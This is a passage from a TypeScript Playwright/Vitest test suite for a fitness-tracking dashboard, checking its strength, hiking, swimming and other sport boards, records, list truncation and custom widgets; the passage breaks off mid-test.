import { readFileSync, writeFileSync } from "node:fs";
import type { Page } from "playwright-core";
import { describe, expect, it } from "vitest";
import { addDays } from "../../src/dates";
import { preset } from "../../src/page/presets";
import { DASHBOARD_VERSION } from "../../src/prompts";
import { pageCode } from "../../src/dashboard-page";
import { data, open, pageFile } from "./page";
import {
  tabs,
  tiles,
  hash,
  hours,
  startEdit,
  hikeRecords,
  gridRows,
  MET,
  chartsWithoutTooltip,
  kpiTexts,
  chartDataset,
  row,
  saved,
  zero,
  rows,
  custom,
  browser,
  withBrowser,
} from "./dashboard-shared";

withBrowser();

const recordLabels = async (tab: string) => {
  const { page } = await open(browser, pageFile(), { hash: tab });
  return page.$$eval("[data-id=records] .badge .kpi-label", (b) =>
    b.map((x) => x.textContent ?? ""),
  );
};

describe("strength board", () => {
  it("shows the Strength widgets", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "records",
      "setsPerCategory",
      "muscleBalance",
      "planAdherence",
      "exercises",
      "strengthSessions",
    ]);
    expect(await rows(page)).toHaveLength(9);
    expect(await page.textContent("[data-id=muscleBalance]")).toMatch(
      /Push : pull sets\s*[\d.]+ : 1/,
    );
    expect(errors).toEqual([]);
  });

  it("shows n/a in the exercises table for a value the sets do not give, and leaves out a skipped exercise", async () => {
    const activities = data.activities.map((a: Record<string, unknown>) => {
      const ex = a.exercises as { exercise: string; sets: Record<string, unknown>[] }[] | undefined;
      if (!ex) return a;
      // the newest session skipped the lat pulldown: every set has 0 reps
      if (String(a.start).startsWith("2026-10-23"))
        return {
          ...a,
          exercises: ex.map((e) =>
            e.exercise === "Lat Pulldown" ? { ...e, sets: zero(e.sets, "reps") } : e,
          ),
        };
      // the newest squats without weight, and pull-ups done once
      if (String(a.start).startsWith("2026-10-19"))
        return {
          ...a,
          exercises: [
            ...ex.map((e) =>
              e.exercise === "Barbell Back Squat" ? { ...e, sets: zero(e.sets, "kg") } : e,
            ),
            { exercise: "Pull Up", primaryMuscles: ["Lats"], sets: [{ reps: 8 }] },
          ],
        };
      return a;
    });
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
      { hash: "#strengthTraining" },
    );
    // sessions, last, top set, best est. 1RM, change
    const cells = (slug: string) =>
      page.$$eval(`[data-exercise=${slug}] td`, (c) => c.slice(1, 6).map((x) => x.textContent));
    const pulldown = await cells("lat-pulldown");
    const deadlift = await cells("romanian-deadlift");
    // the deadlift was done in the same sessions, up to the newest
    expect([pulldown[0], pulldown[1]]).toEqual([String(Number(deadlift[0]) - 1), "Oct 16"]);
    expect((await cells("barbell-back-squat"))[2]).toBe("n/a");
    expect((await cells("plank"))[3]).toBe("n/a");
    expect(await cells("pull-up")).toEqual(["1", "Oct 19", "8 reps", "n/a", "n/a"]);
    expect(errors).toEqual([]);
  });

  it("leaves out a session without sets and says so, and has no note when every session has sets", async () => {
    const note = /strength session has no sets/;
    const full = await open(browser, pageFile(), { hash: "#strengthTraining" });
    expect(await full.page.innerText("[data-id=setsPerCategory]")).not.toMatch(note);
    // the oldest strength session lost its sets, as one past the 30 newest
    const oldest = data.activities.findLastIndex((a: { type: string }) =>
      a.type.includes("strength"),
    );
    const activities = data.activities.map((a: Record<string, unknown>, i: number) =>
      i === oldest ? { ...a, exercises: undefined } : a,
    );
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
      { hash: "#strengthTraining" },
    );
    for (const id of ["setsPerCategory", "muscleBalance"])
      expect(await page.innerText(`[data-id=${id}]`)).toContain(
        "1 strength session has no sets (past the 30 newest without a saved .FIT file, or not readable): its week is left out.",
      );
    expect(await page.innerText("[data-id=exercises]")).toContain("1 strength session has no sets");
    expect(errors).toEqual([]);
  });

  it("tags a lift whose last sessions are more than 5% under the ones before as down", async () => {
    // once a week: the 3 newest bench press sessions are the last 14 days, at 80% of their weight
    let newest = 3;
    const activities = data.activities.map((a: Record<string, unknown>) => {
      const ex = a.exercises as { exercise: string; sets: { kg?: number }[] }[] | undefined;
      if (!ex?.some((e) => e.exercise === "Barbell Bench Press") || newest-- <= 0) return a;
      return {
        ...a,
        exercises: ex.map((e) =>
          e.exercise === "Barbell Bench Press"
            ? { ...e, sets: e.sets.map((s) => ({ ...s, kg: (s.kg ?? 0) * 0.8 })) }
            : e,
        ),
      };
    });
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
      { hash: "#strengthTraining" },
    );
    const tag = page.locator("[data-exercise=barbell-bench-press] td:first-child .tag");
    expect(await tag.textContent()).toBe("down");
    expect(await tag.getAttribute("title")).toBe(
      "The best of the last sessions (14 days or more) is more than 5% under the best of as many sessions before them",
    );
    expect(errors).toEqual([]);
  });

  it("says why it shows nothing when no session has sets, instead of bars of 0", async () => {
    // for example when Garmin's .FIT download fails for every session
    const activities = data.activities.map((a: Record<string, unknown>) =>
      Array.isArray(a.exercises) ? { ...a, exercises: undefined, detailError: "HTTP 500" } : a,
    );
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
      { hash: "#strengthTraining" },
    );
    for (const id of ["setsPerCategory", "muscleBalance", "exercises"]) {
      expect(await page.$$(`[data-id=${id}] canvas`)).toHaveLength(0);
      expect(await page.innerText(`[data-id=${id}] .empty`)).toMatch(
        /^24 strength sessions have no sets/,
      );
    }
    expect(errors).toEqual([]);
  });

  it("tags the stalled lifts next to their name and says what the change compares", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    // the tag is the lift's state now, apart from the change since its first sessions
    const tagged = await page.$$eval(".ex-row td:first-child .tag", (t) =>
      t.map((x) => [
        x.parentElement!.querySelector(".linkish")!.textContent,
        x.textContent,
        (x as HTMLElement).title,
      ]),
    );
    // the plank is timed: it gets no tag
    expect(tagged).toEqual([
      [
        "Barbell Bench Press",
        "stalled",
        "No new best in the last sessions (14 days or more) against as many sessions before them",
      ],
    ]);
    expect(await page.innerText("[data-id=exercises]")).toContain(
      "Change: the best of the last 3 sessions against the best of the first 3",
    );
    expect(errors).toEqual([]);
  });

  it("searches, filters by group, and a second click on the chip shows all groups", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    await page.fill(".search", "squat");
    expect(await rows(page)).toEqual(["Barbell Back Squat"]);
    await page.fill(".search", "");
    await page.click("[data-id=exercises] .chips >> text=Shoulders");
    expect(await rows(page)).toEqual(["Dumbbell Shoulder Press"]);
    await page.click("[data-id=exercises] .chips >> text=Shoulders");
    expect(await rows(page)).toHaveLength(9);
  });

  it("sorts by a column, and a second click turns the order", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const sort = () => page.getAttribute("[data-id=exercises] th[aria-sort]", "aria-sort");
    await page.click("[data-id=exercises] .sort >> text=Best est. 1RM");
    expect(await sort()).toBe("descending");
    await page.click("[data-id=exercises] .sort >> text=Best est. 1RM");
    expect(await sort()).toBe("ascending");
  });

  it("opens an exercise with a name in another script, and keeps it in the hash", async () => {
    const renamed: Record<string, string> = { Plank: "Планка", "Lat Pulldown": "腹筋" };
    const activities = data.activities.map((a: Record<string, unknown>) =>
      Array.isArray(a.exercises)
        ? {
            ...a,
            exercises: a.exercises.map((e: { exercise: string }) => ({
              ...e,
              exercise: renamed[e.exercise] ?? e.exercise,
            })),
          }
        : a,
    );
    const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } });
    const { page, errors } = await open(browser, file, { hash: "#strengthTraining" });
    await page.click("[data-exercise='腹筋']");
    expect(await page.textContent(".detail h3")).toBe("腹筋");
    expect(decodeURIComponent(await hash(page))).toMatch(/\/腹筋$/);
    expect(await page.getAttribute("[data-exercise='планка']", "data-exercise")).toBe("планка");

    const again = await open(browser, file, { hash: await hash(page) });
    expect(await again.page.textContent(".detail h3")).toBe("腹筋");
    expect(errors).toEqual([]);
  });

  it("opens an exercise with a click or Enter, keeps it in the hash, and closes it with a second click", async () => {
    const file = pageFile();
    const { page, errors } = await open(browser, file, { hash: "#strengthTraining" });
    await page.click("[data-exercise=barbell-back-squat]");
    expect(await hash(page)).toMatch(/^#strengthTraining@.+\/barbell-back-squat$/);
    expect(await page.textContent(".detail h3")).toBe("Barbell Back Squat");
    expect(await page.$$eval(".detail .ex-sessions > li", (l) => l.length)).toBe(12);
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    await page.click("[data-exercise=barbell-back-squat]");
    expect(await page.$(".detail")).toBeNull();

    await page.focus("[data-exercise=plank] button");
    await page.keyboard.press("Enter");
    expect(await page.textContent(".detail h3")).toBe("Plank");
    // focus goes to the detail, which opens after the table
    expect(await page.evaluate(() => document.activeElement?.textContent)).toBe("Plank");

    const again = await open(browser, file, {
      hash: "#strengthTraining@2026-08-03_2026-10-26/lat-pulldown",
    });
    expect(await again.page.textContent(".detail h3")).toBe("Lat Pulldown");
    expect(errors).toEqual([]);
  });

  it("opens and closes a session", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const first = "[data-id=strengthSessions] details >> nth=0";
    await page.click(`${first} >> summary`);
    expect(await page.getAttribute(first, "open")).toBe("");
    await page.click(`${first} >> summary`);
    expect(await page.getAttribute(first, "open")).toBeNull();
  });

  it("shows the last six sessions first, newest on top", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const summaries = () =>
      page.$$eval("[data-id=strengthSessions] details:not([hidden]) summary", (s) =>
        s.map((x) => x.textContent),
      );
    const shown = await summaries();
    expect(shown).toHaveLength(10);
    expect(shown[0]).toMatch(/^Oct 23/);
    await page.click("[data-id=strengthSessions] >> text=Show all 24");
    expect(await summaries()).toHaveLength(24);
  });
});

const summary = async (prevStart: string, activities: unknown[]) => {
  const { page } = await open(
    browser,
    pageFile({ data: { ...data, v: DASHBOARD_VERSION, prevStart, activities } }),
    { hash: "#hiking" },
  );
  return page.innerText("[data-id=typeKpis] .kpi >> nth=0");
};

const easyRun = (id: number, start: string) => ({
  id,
  name: "Easy Run",
  type: "running",
  sport: "running",
  start: `${start} 07:00:00`,
  km: 8,
  duration: "48:00",
  pace: "6:00/km",
  avgHR: 120,
});

describe("walk, hike, bike, swim and racket sport boards", () => {
  const hike = {
    id: 9001,
    name: "Ridge Hike",
    type: "hiking",
    sport: "hiking",
    start: "2026-10-25 09:00:00",
    km: 12,
    duration: "3:00:00",
    ascentM: 900,
    avgHR: 120,
    maxHR: 150,
    trainingLoad: 120,
  };
  const swim = {
    id: 9002,
    name: "Pool Swim",
    type: "lap_swimming",
    sport: "swimming",
    start: "2026-10-24 07:00:00",
    km: 1.5,
    duration: "30:00",
    swolf: 38,
    lengths: 60,
    strokes: 900,
    poolLengthM: 25,
    avgHR: 130,
    trainingLoad: 40,
  };

  /** The sessions of every kind of board: `count` of each, one hour long. */
  const everySport = (count: number) => {
    const sessions = [
      { name: "Easy Run", type: "running", sport: "running", km: 8, pace: "6:00/km" },
      { name: "Night Walk", type: "walking", sport: "walking", km: 3, steps: 4000 },
      { name: "Ridge Hike", type: "hiking", sport: "hiking", km: 12, ascentM: 900 },
      { name: "Road Ride", type: "road_biking", sport: "cycling", km: 40, ascentM: 300 },
      { ...swim, id: undefined, start: undefined },
      { name: "Club Tennis", type: "tennis", sport: "racket" },
      // a sport without widgets of its own, and one with no known SDK sport
      { name: "Ski Day", type: "resort_skiing", sport: "alpineSkiing", km: 30 },
      { name: "Yoga", type: "yoga" },
      {
        name: "Strength A",
        type: "strength_training",
        sport: "fitnessEquipment",
        exercises: [{ exercise: "Push Up", category: "Push Up", sets: [{ reps: 10 }] }],
      },
    ];
    return sessions.flatMap((s, i) =>
      Array.from({ length: count }, (_, n) => ({
        duration: "1:00:00",
        avgHR: 130,
        ...s,
        id: 20_000 + i * 100 + n,
        start: `${addDays("2026-10-25", -n)} 0${i}:00:00`,
      })),
    );
  };
  const tennis = {
    id: 9004,
    name: "Club Tennis",
    type: "tennis",
    sport: "racket",
    start: "2026-10-22 19:00:00",
    duration: "40:00",
    elapsed: "1:30:00",
    avgHR: 140,
    maxHR: 178,
    trainingLoad: 95,
  };
  // no SDK sport known for this type: it goes to the Other board
  const yoga = {
    id: 9003,
    name: "Yoga",
    type: "yoga",
    start: "2026-10-23 19:00:00",
    duration: "45:00",
    avgHR: 90,
  };
  const ski = {
    id: 9005,
    name: "Ski Day",
    type: "resort_skiing",
    sport: "alpineSkiing",
    start: "2026-10-21 10:00:00",
    km: 30,
    duration: "3:00:00",
    avgHR: 120,
  };
  const more = () =>
    pageFile({
      data: {
        ...data,
        v: DASHBOARD_VERSION,
        activities: [hike, swim, yoga, tennis, ski, ...data.activities],
      },
    });

  it("adds a tab for each other sport in the data, and the Other tab last", async () => {
    const { page } = await open(browser, more());
    expect((await tabs(page)).map(([tab]) => tab)).toEqual([
      "all",
      "recovery",
      "running",
      "strengthTraining",
      "walking",
      "hiking",
      "cycling",
      "swimming",
      "racket",
      "alpineSkiing",
      "generic",
    ]);
    expect(await page.textContent("[data-tab=alpineSkiing] span")).toBe("Alpine skiing");
    expect(await page.textContent("[data-tab=generic] span")).toBe("Other");
    // a sport of an icon family has that icon, not the generic one of Other
    const d = (tab: string) => page.getAttribute(`[data-tab=${tab}] path`, "d");
    expect(await d("alpineSkiing")).not.toBe(await d("generic"));
  });

  it("gives a new sport the board of the Other tab", async () => {
    const { page, errors } = await open(browser, more(), { hash: "#alpineSkiing" });
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "records",
      "activities",
    ]);
    expect(await page.textContent("[data-tab=alpineSkiing] .count")).toBe("1");
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("draws the bars and the period row of another sport", async () => {
    // a board with a single session shows a note instead of the chart, so give it two
    const two = pageFile({
      data: {
        ...data,
        v: DASHBOARD_VERSION,
        activities: [{ ...ski, id: 9006, start: "2026-10-14 10:00:00" }, ski, ...data.activities],
      },
    });
    const { page, errors } = await open(browser, two, { hash: "#alpineSkiing" });
    const bars = await page.evaluate(() => {
      const c = Object.values(window.Chart!.instances).find((x) =>
        x.canvas.closest("[data-widget=typeWeekly]"),
      )!;
      return c.data.datasets.filter((d) => d.type === "bar").map((d) => d.label);
    });
    expect(bars).toEqual(["Alpine skiing"]);
    await page.click("[data-tab=all]");
    expect(await page.textContent("[data-widget=periodComparison]")).toContain("Alpine skiing");
    expect(errors).toEqual([]);
  });

  it("adds a widget to another sport's board with that sport as its type", async () => {
    const { page } = await open(browser, more(), { hash: "#alpineSkiing" });
    await startEdit(page);
    await page.click(".edit-bar >> text=Add widget");
    const select = page.locator(".catalogue li:has-text('Weekly volume') select");
    expect(await select.inputValue()).toBe("alpineSkiing");
  });

  it("draws every extra board without errors, with a tooltip on every chart", async () => {
    const { page, errors } = await open(browser, more());
    for (const tab of ["walking", "hiking", "cycling", "swimming", "racket", "generic"]) {
      await page.click(`[data-tab=${tab}]`);
      expect([tab, await chartsWithoutTooltip(page)]).toEqual([tab, []]);
    }
    expect(errors).toEqual([]);
  });

  const hikes = (...back: number[]) =>
    back.map((n, i) => ({
      ...hike,
      id: 30_000 + i,
      start: `${addDays("2026-10-25", -n)} 09:00:00`,
    }));
  it("says that the change of a summary tile is the last 7 days, and needs 4 weeks before them", async () => {
    // 2 hikes in the last 7 days against 2 in the 4 weeks before: 300% over their mean week
    const both = hikes(1, 2, 10, 20);
    const shown = await summary("2026-01-05", both);
    expect(shown).toContain("300%");
    expect(shown).toContain("last 7 days vs 4-week average");
    // the same hikes when the data starts 10 days ago: part of 4 weeks is no average
    const part = await summary("2026-10-15", both);
    expect(part).not.toContain("%");
    expect(part).not.toContain("4-week");
    // nothing in the 4 weeks before: no number, and no label that names one
    expect(await summary("2026-01-05", hikes(1))).not.toContain("4-week");
  });

  it("compares the aerobic efficiency only with 3 runs or more on both sides", async () => {
    const others = data.activities.filter((a: { sport?: string }) => a.sport !== "running");
    const sub = async (last: number) => {
      const first = [0, 1, 2].map((n) => easyRun(40_000 + n, addDays(data.start, n + 1)));
      const recent = Array.from({ length: last }, (_, n) =>
        easyRun(41_000 + n, addDays("2026-10-25", -n)),
      );
      const { page } = await open(
        browser,
        pageFile({
          data: { ...data, v: DASHBOARD_VERSION, activities: [...recent, ...first, ...others] },
        }),
        { hash: "#running" },
      );
      return {
        sub: await page.$("[data-id=aerobicFitness] .kpi-sub"),
        delta: await page.$("[data-id=aerobicFitness] .kpi-sub .delta"),
      };
    };
    // no change figure: no sub line at all, not "vs first n weeks" without a number
    expect((await sub(2)).sub).toBeNull();
    expect((await sub(3)).delta).not.toBeNull();
  });

  it("places each aerobic run on the week of its day, a Monday and a Sunday included", async () => {
    const runs = [
      // 5:00/km is 200 m/min, so the efficiency is 200 / HR; a Sunday, a Monday, the first week
      { ...easyRun(42_000, "2026-10-25"), pace: "5:00/km", avgHR: 100 },
      { ...easyRun(42_001, "2026-09-07"), pace: "5:00/km", avgHR: 125 },
      { ...easyRun(42_002, "2026-08-05"), pace: "5:00/km", avgHR: 100 },
    ];
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: runs } }),
      { hash: "#running" },
    );
    const points = await page.evaluate(() =>
      Object.values(window.Chart!.instances)
        .filter((c) => c.canvas.closest("[data-widget=aerobicFitness]"))
        .flatMap((c) => c.data.datasets)
        .filter((d) => d.label === "Aerobic runs")
        .map((d) => d.data),
    );
    // oldest first, each point on its week's label
    expect(points).toEqual([
      [
        { x: "Aug 3", y: 2 },
        { x: "Sep 7", y: 1.6 },
        { x: "Oct 19", y: 2 },
      ],
    ]);
    expect(errors).toEqual([]);
  });

  it("gives every sport its longest session, by distance or else by time", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: everySport(2) } }),
    );
    const longest = async (tab: string) => {
      await page.click(`[data-tab=${tab}]`);
      return page.$$eval("[data-id=records] .badge", (found) =>
        found.map((b) => [
          b.querySelector(".kpi-label")?.textContent,
          b.querySelector(".badge-value")?.textContent,
        ]),
      );
    };
    expect(await longest("running")).toEqual([["Longest session · Run", "8.0 km"]]);
    expect(await longest("walking")).toEqual([["Longest session · Walk", "3.0 km"]]);
    expect(await longest("hiking")).toEqual([["Longest session · Hike", "12.0 km"]]);
    expect(await longest("cycling")).toEqual([["Longest session · Bike", "40.0 km"]]);
    expect(await longest("swimming")).toEqual([["Longest session · Swim", "1.50 km"]]);
    // no distance: the time, on a board with its own widgets, a generic one and a strength one
    expect((await longest("racket"))[0][1]).toBe("1:00:00");
    expect((await longest("generic"))[0][1]).toBe("1:00:00");
    expect((await longest("strengthTraining"))[0][1]).toBe("1:00:00");
    // a sport without widgets of its own has the tile too
    expect((await longest("alpineSkiing"))[0]).toEqual([
      "Longest session · Alpine skiing",
      "30.0 km",
    ]);
    expect(errors).toEqual([]);
  });

  it("takes the time when a session has distance 0, and shows no record without both", async () => {
    const trek = { name: "Hike", type: "hiking", sport: "hiking", start: "2026-10-20 08:00:00" };
    const withTime = { ...trek, id: 1, km: 0, duration: "2:00:00" };
    expect(await hikeRecords([withTime])).toContain("2:00:00");
    expect(await hikeRecords([{ ...trek, id: 1 }])).toContain("No records");
  });

  it("keeps the oldest run on a tie in the records, as Best efforts and the digest", async () => {
    const run = { type: "running", sport: "running", km: 5, best: { "5k": "25:00" } };
    // newest first, as the server writes them
    const activities = [
      { ...run, id: 2, name: "New Park", start: "2026-10-20 08:00:00" },
      { ...run, id: 1, name: "Old Park", start: "2026-10-13 08:00:00" },
    ];
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
    );
    const badge = page.locator("[data-id=records] .badge", { hasText: "Fastest 5 km" });
    expect(await badge.innerText()).toContain("Old Park");
    expect(errors).toEqual([]);
  });

  it("shows the fastest run in the records, not the first one", async () => {
    const run = { type: "running", sport: "running", km: 5 };
    // newest first; the older run is slower, so the progression has two entries
    const activities = [
      { ...run, id: 2, name: "New Park", start: "2026-10-20 08:00:00", best: { "5k": "24:00" } },
      { ...run, id: 1, name: "Old Park", start: "2026-10-13 08:00:00", best: { "5k": "26:00" } },
    ];
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
    );
    const badge = page.locator("[data-id=records] .badge", { hasText: "Fastest 5 km" });
    const text = await badge.innerText();
    expect(text).toContain("New Park");
    expect(text).toContain("24:00");
    expect(errors).toEqual([]);
  });

  it("repeats no table of its board: efforts and 1RM records are on the all board", async () => {
    expect(await recordLabels("#running")).toEqual(["Longest session · Run"]);
    const lifts = await recordLabels("#strengthTraining");
    expect(lifts).toContain("Heaviest set");
    expect(lifts.filter((l) => l.startsWith("Best est."))).toEqual([]);
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    expect(await page.innerText("[data-id=records]")).not.toContain("1RM values");
  });

  it("cuts every list at the same length, with Show all, on every board", async () => {
    const activities = everySport(14);
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
    );
    const lists = () =>
      page.$$eval("[data-id]", (found) =>
        found
          // a table of exercises is grouped and has its own search
          .filter((t) => (t as HTMLElement).dataset.id !== "exercises")
          .map((t) => {
            const items = [
              ...t.querySelectorAll(
                ":scope table.data > tbody > tr:not(.laps-row), :scope details.session",
              ),
            ] as HTMLElement[];
            return {
              id: (t as HTMLElement).dataset.id,
              all: items.length,
              shown: items.filter((r) => !r.hidden).length,
              button: t.querySelector(".btn.more")?.textContent,
            };
          })
          .filter((l) => l.all > 0),
      );
    const cut = new Set<string>();
    const boards = await page.$$eval("[data-tab]", (b) =>
      b.map((x) => (x as HTMLElement).dataset.tab),
    );
    for (const tab of boards) {
      await page.click(`[data-tab=${tab}]`);
      for (const { id, all, shown, button } of await lists()) {
        if (all > 10) cut.add(`${tab}:${id}`);
        expect([tab, id, shown]).toEqual([tab, id, Math.min(all, 10)]);
        if (all > 10) expect([tab, id, button]).toEqual([tab, id, `Show all ${all}`]);
      }
    }
    // the check above saw the lists of each sport, on the boards that have no list of their own too
    for (const list of [
      "running:activities",
      "strengthTraining:strengthSessions",
      "walking:walkDetails",
      "hiking:hikeVertical",
      "cycling:bikeDetails",
      "swimming:swimDetails",
      "racket:racketDetails",
      "alpineSkiing:activities",
      "generic:activities",
    ]) {
      expect(cut).toContain(list);
    }
    // the same button opens them: all rows, on a board with its own widget
    await page.click("[data-tab=hiking]");
    await page.click("[data-id=hikeVertical] >> text=Show all 14");
    expect(
      await page.$$eval("[data-id=hikeVertical] tbody tr:not([hidden])", (r) => r.length),
    ).toBe(14);
    expect(errors).toEqual([]);
  });

  it("gives a swim its pace per 100 m in the activity list and its laps", async () => {
    const laps = [{ lap: 1, km: 0.1, time: "1:50", kmh: 3.3, swimPace: "1:50/100 m" }];
    const { page } = await open(
      browser,
      pageFile({
        data: {
          ...data,
          v: DASHBOARD_VERSION,
          activities: [{ ...swim, pace: "20:00/km", laps }, ...data.activities],
        },
      }),
      { hash: "#swimming" },
    );
    const newest = page.locator("[data-id=activities] table.data > tbody > tr").first();
    expect(await newest.locator("td").nth(5).textContent()).toBe("2:00/100 m");
    await newest.locator(".linkish").click();
    expect(await page.textContent("[data-id=activities] .laps-row table")).toContain("1:50/100 m");
  });

  it("gives the numbers of each sport", async () => {
    const { page } = await open(browser, more(), { hash: "#hiking" });
    expect(await page.textContent("[data-id=hikeVertical]")).toContain("300 m/h");
    await page.click("[data-tab=swimming]");
    expect(await page.textContent("[data-id=swimDetails]")).toContain("2:00/100 m");
    await page.click("[data-tab=cycling]");
    expect(await page.textContent("[data-id=bikeDetails] .kpis")).toContain("3 rides");
    // 244 m in 1:09:33 of moving time
    expect(await page.innerText("[data-id=hikeVertical]")).toContain("210 m/h");
    // the whole ride counts, so the note says the route moves the number
    expect(await page.innerText("[data-id=hikeVertical]")).toContain("on the same route");
    // the ride of 2026-10-11: 327 + 1357 of 4175 zone seconds are easy, 784 + 347 hard
    const easy = (await chartDataset(page, "intensityShare", "Z1-2 (easy)")).data as number[];
    const hard = (await chartDataset(page, "intensityShare", "Z4-5 (hard)")).data as number[];
    expect(easy.filter((v) => v !== null)).toHaveLength(3);
    expect(easy.at(-4)).toBeCloseTo((1684 / 4175) * 100, 1);
    expect(hard.at(-4)).toBeCloseTo((1131 / 4175) * 100, 1);
    await page.click("[data-tab=racket]");
    // tennis and padel share the board; the sport column tells them apart
    const sports = await page.$$eval("[data-id=racketDetails] tbody tr", (r) =>
      r.map((x) => x.children[2].textContent),
    );
    // in the order of the data, where the test puts tennis first
    expect(sports).toEqual(["Tennis", "Padel", "Padel", "Padel"]);
    const numeric = await page.$$eval("[data-id=racketDetails] thead th", (th) =>
      th.map((x) => x.classList.contains("num")),
    );
    expect(numeric).toEqual([false, false, false, true, true, true, true, true, true, true, true]);
    expect(await page.textContent("[data-tab=racket] .count")).toBe("4");
    await page.click("[data-tab=walking]");
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "records",
      "steps",
      "walkDetails",
      "activities",
    ]);
  });
});

const noLoad = (a: Record<string, unknown>) => ({ ...a, trainingLoad: undefined });
const on = (...ids: string[]) => ({
  rev: "c",
  base: "preset",
  seen: MET,
  boards: { all: ids.map((id) => ({ id, widget: id, span: 1 })) },
});

/** The first row of the Activities table. */
async function firstRow(file: string): Promise<string | null> {
  const { page, errors } = await open(browser, file);
  expect(errors).toEqual([]);
  return page.textContent("[data-id=activities] tbody tr");
}
/** A custom widget that shows the length and the ends of the data arrays. */
const probe = custom(
  "probe",
  "const d = ctx.data; el.textContent = [d.weeks, d.start, d.activities.length, d.activities[0].start, d.previousActivities.length, d.previousActivities[0].start, d.hrv.length, d.hrv.at(-1).date, d.recovery.length].join(' ');",
);
/** The probe tile and the first Activities row, before and after a redraw (tab switch). */
async function probed(file: string): Promise<(string | null)[]> {
  const { page, errors } = await open(browser, file);
  const read = () =>
    Promise.all([
      page.textContent("[data-id=probe] .tile-body"),
      page.textContent("[data-id=activities] tbody tr"),
    ]);
  const first = await read();
  await page.click("[role=tab] >> nth=1");
  await page.click("[data-tab=all]");
  const again = await read();
  expect(await page.$$(".tile .error")).toEqual([]);
  expect(errors).toEqual([]);
  return [...first, ...again];
}

/** A custom widget that draws a chart of `type`. */
const chartOf = (type: string) =>
  `ctx.chart(el, { type: "${type}", data: { labels: ["a", "b"], datasets: [{ data: [1, 2] }] } });`;

describe("custom widgets and languages", () => {
  it("runs a custom widget with the widget API, chart and all", async () => {
    const code = `
      const p = document.createElement("p");
      p.className = "rides";
      p.textContent = ctx.activities.filter((a) => ctx.calc.groupOf(a) === "cycling").length + " rides </script>";
      el.append(p);
      ctx.chart(el, { type: "bar", data: { labels: ["a", "b"], datasets: [{ label: "x", data: [1, 2], backgroundColor: ctx.color("cycling") }] } });`;
    const { page, errors } = await open(
      browser,
      pageFile({ widgets: [custom("rides", code)], layout: on("rides") }),
    );
    expect(await page.textContent("[data-id=rides] h2")).toBe("Custom rides");
    expect(await page.textContent(".rides")).toBe("3 rides </script>");
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("keeps the order of the data for the other tiles when a custom widget reorders it", async () => {
    const flip = custom(
      "flip",
      "ctx.data.activities.reverse(); ctx.data.previousActivities.reverse(); el.textContent = 'flipped';",
    );
    const alone = await firstRow(pageFile({ layout: on("activities") }));
    const after = await firstRow(pageFile({ widgets: [flip], layout: on("flip", "activities") }));
    expect(after).toBe(alone);
  });

  it("gives each custom widget its own data arrays, also after a redraw", async () => {
    // sorts, cuts and adds to the arrays; it still draws (the arrays are not frozen)
    const mess = custom(
      "mess",
      `const d = ctx.data;
      d.activities.sort((a, b) => (a.start < b.start ? -1 : 1));
      d.activities.splice(0, 5);
      d.activities.push(d.activities[0]);
      d.previousActivities.reverse();
      d.hrv.reverse();
      d.hrv.splice(0, 3);
      d.recovery.push({});
      el.textContent = "messed";`,
    );
    const alone = await probed(pageFile({ widgets: [probe], layout: on("probe", "activities") }));
    expect(alone[0]).toBe(
      [
        data.weeks,
        data.start,
        data.activities.length,
        data.activities[0].start,
        data.previousActivities.length,
        data.previousActivities[0].start,
        data.hrv.length,
        data.hrv.at(-1).date,
        data.recovery.length,
      ].join(" "),
    );
    const after = await probed(
      pageFile({ widgets: [mess, probe], layout: on("mess", "probe", "activities") }),
    );
    expect(after).toEqual(alone);
  });

  it("shows the texts of a custom widget in the page language, else in English", async () => {
    const texts = {
      en: { title: "Longest ride", best: "Best: {n}", only: "English only" },
      it: { title: "Uscita più lunga", best: "Migliore: {n}" },
    };
    const code = `el.textContent = ctx.text("best", { n: 42 }) + " / " + ctx.text("only");`;
    const { page, errors } = await open(
      browser,
      pageFile({
        settings: { languages: ["en", "it"] },
        widgets: [{ ...custom("ride", code), texts }],
        layout: on("ride"),
      }),
      { locale: "it-IT" },
    );
    expect(await page.textContent("[data-id=ride] h2")).toBe("Uscita più lunga");
    expect(await page.textContent("[data-id=ride] .tile-body")).toBe("Migliore: 42 / English only");
    await page.click(".account summary");
    await page.selectOption("#lang", "en");
    expect(await page.textContent("[data-id=ride] h2")).toBe("Longest ride");
    expect(errors).toEqual([]);
  });

  it("gives the notes to a custom widget as plain text", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        data: { ...data, v: DASHBOARD_VERSION, notes: ["Don&#39;t skip Z2 &amp; strides"] },
        widgets: [custom("note", "el.textContent = ctx.data.notes[0];")],
        layout: on("note"),
      }),
